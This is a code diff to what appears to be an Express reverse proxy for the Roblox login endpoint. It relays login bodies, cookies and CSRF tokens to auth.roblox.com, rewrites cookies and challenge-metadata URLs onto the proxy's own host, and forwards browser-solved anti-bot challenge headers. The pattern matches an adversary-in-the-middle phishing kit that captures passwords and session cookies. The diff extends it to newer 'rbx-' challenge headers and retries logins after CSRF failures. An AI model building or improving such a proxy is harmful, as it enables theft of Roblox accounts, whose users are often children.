@@ -62,6 +62,10 @@ const CHALLENGE_HEADERS = [
     'rblx-challenge-type',
     'rblx-challenge-metadata',
     'rblx-challenge-solution',
+    'rbx-challenge-id',
+    'rbx-challenge-type',
+    'rbx-challenge-metadata',
+    'rbx-challenge-solution',
 ];
 
 function rewriteCookies(cookies, host) {
@@ -149,7 +153,7 @@ function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders) {
         if (cookieHeader) headers['Cookie'] = cookieHeader;
         if (csrfToken)    headers['X-CSRF-TOKEN'] = csrfToken;
 
-        const hasChallengeSolution = !!extraHeaders['rblx-challenge-id'];
+        const hasChallengeSolution = !!(extraHeaders['rblx-challenge-solution'] || extraHeaders['rbx-challenge-solution']);
         console.log(`   → POST auth.roblox.com/v2/login | CSRF: ${csrfToken ? csrfToken.slice(0,8)+'...' : 'none'} | Cookie: ${cookieHeader ? 'yes' : 'none'} | Challenge: ${hasChallengeSolution ? 'YES' : 'NO'}`);
 
         const options = {
@@ -191,8 +195,18 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
     const deviceId = getDeviceId(req);
 
     // Check if this is a challenge retry from browser
-    const hasChallengeSolution = req.headers['rblx-challenge-id'];
-    console.log(`🔑 LOGIN | Challenge solution from browser: ${hasChallengeSolution ? 'YES' : 'NO'}`);
+    const hasChallengeSolution = req.headers['rblx-challenge-solution'] || req.headers['rbx-challenge-solution'];
+    const hasChallengeId = req.headers['rblx-challenge-id'] || req.headers['rbx-challenge-id'];
+    console.log(`🔑 LOGIN | Challenge solution from browser: ${hasChallengeSolution ? 'YES' : 'NO'} | Challenge ID: ${hasChallengeId ? 'YES' : 'NO'}`);
+
+    // Debug: Log all challenge-related headers
+    const challengeHeaders = {};
+    for (const h of CHALLENGE_HEADERS) {
+        if (req.headers[h]) challengeHeaders[h] = req.headers[h].substring(0, 50) + '...';
+    }
+    if (Object.keys(challengeHeaders).length > 0) {
+        console.log('   Challenge headers received:', challengeHeaders);
+    }
 
     try {
         const bodyStr = req.body.toString('utf8');
@@ -200,32 +214,35 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
         // If browser sent challenge solution, forward directly to Roblox
         if (hasChallengeSolution) {
             console.log('   Forwarding challenge solution to Roblox...');
-            
-            // Need CSRF token first
-            const tokenFetch = await doLoginRequestWithRetry(bodyStr, incomingCookies, null, ua, req.headers);
-            const csrfToken = tokenFetch.headers['x-csrf-token'];
-            
-            if (!csrfToken) {
-                console.log('   No CSRF token available');
-                return forwardResponse(res, tokenFetch, host, origin, deviceId);
+
+            // Try direct login first with challenge solution (no CSRF initially)
+            let result = await doLoginRequestWithRetry(bodyStr, incomingCookies, null, ua, req.headers);
+            console.log(`   Challenge login attempt 1: ${result.status}`);
+
+            // If we got a CSRF token, retry with it
+            if (result.status === 403 && result.headers['x-csrf-token']) {
+                const csrfToken = result.headers['x-csrf-token'];
+                console.log(`   Got CSRF token, retrying...`);
+
+                let cookieHeader = incomingCookies;
+                if (result.headers['set-cookie']) {
+                    const extra = result.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
+                    cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
+                }
+
+                result = await doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, req.headers);
+                console.log(`   Challenge login attempt 2: ${result.status}`);
             }
 
-            // Now do the actual login with challenge solution
-            let cookieHeader = incomingCookies;
-            if (tokenFetch.headers['set-cookie']) {
-                const extra = tokenFetch.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
-                cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
-            }
-
-            const result = await doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, req.headers);
-            console.log(`   Challenge login result: ${result.status}`);
-            
             if (result.status === 200) {
                 console.log('✅ LOGIN SUCCESS (with challenge)');
             } else {
                 console.log(`❌ LOGIN FAILED: ${result.status}`);
+                if (result.headers['rblx-challenge-id']) {
+                    console.log('   New challenge required');
+                }
             }
-            
+
             return forwardResponse(res, result, host, origin, deviceId);
         }
 
@@ -287,12 +304,14 @@ function forwardResponse(res, response, host, origin, deviceId) {
     const headers = response.headers;
 
     // Rewrite challenge metadata if present
-    if (headers['rblx-challenge-metadata']) {
-        const original = headers['rblx-challenge-metadata'];
+    const metadataKey = headers['rblx-challenge-metadata'] ? 'rblx-challenge-metadata' : 
+                        headers['rbx-challenge-metadata'] ? 'rbx-challenge-metadata' : null;
+    if (metadataKey) {
+        const original = headers[metadataKey];
         const rewritten = rewriteChallengeMetadata(original, host);
         if (rewritten !== original) {
             console.log('   Rewrote challenge metadata URLs');
-            headers['rblx-challenge-metadata'] = rewritten;
+            headers[metadataKey] = rewritten;
         }
     }
 
@@ -308,6 +327,10 @@ function forwardResponse(res, response, host, origin, deviceId) {
         'rblx-challenge-type', 
         'rblx-challenge-metadata',
         'rblx-challenge-solution',
+        'rbx-challenge-id',
+        'rbx-challenge-type', 
+        'rbx-challenge-metadata',
+        'rbx-challenge-solution',
         'content-type',
         'cache-control',
     ];
